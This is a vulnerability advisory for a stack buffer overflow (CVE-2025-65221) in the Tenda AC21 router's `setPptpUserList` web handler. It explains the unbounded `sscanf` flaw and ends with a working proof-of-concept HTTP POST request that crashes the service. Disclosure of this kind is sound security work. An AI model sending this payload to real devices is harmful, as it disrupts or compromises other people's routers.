------
### **CVE-2025-65221**

**Affected Product**: Tenda AC21 Router

**Affected Firmware Versions**:  V16.03.08.16

**Vulnerability Type**: Buffer Overflow Vulnerability


------
### **Vulnerability Description**

A stack-based buffer overflow vulnerability exists in the `list` parameter processed by the `/goform/setPptpUserList` handler inside the `/bin/httpd` binary of the Tenda AC21 router running the latest firmware version V16.03.08.16. A remote attacker can trigger this flaw by sending a crafted HTTP request, leading to a denial-of-service condition or potentially arbitrary code execution.


---
### **Vulnerability Details**
In the `httpd` binary, the function corresponding to `/goform/setPptpUserList` is `formSetPPTPUserList`.

![7](./img/7.png)

The function first uses `webGetVar` to retrieve the value of the `list` parameter from `a1` and assign it to `s`. It then uses `strspn` to skip leading `"~"` characters and assigns the pointer to the remaining valid content to `v20`.
![8](./img/8.png)


It then calls `getEachListFromWeb`, where the `"%[^;]"` and `"%s"` format specifiers in `sscanf` do not define maximum field widths, and the `v21` buffer is smaller than `v20`, resulting in a stack overflow vulnerability.
![9](./img/9.png)


---
### **PoC**
```
POST /goform/setPptpUserList HTTP/1.1
Host: 192.168.254.139
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/plain, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 608
Origin: http://192.168.254.139
Connection: close
Priority: u=0

list=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```


After the request was sent, a segmentation fault occurred in the service:

![10](./img/10.png)

![11](./img/11.png)
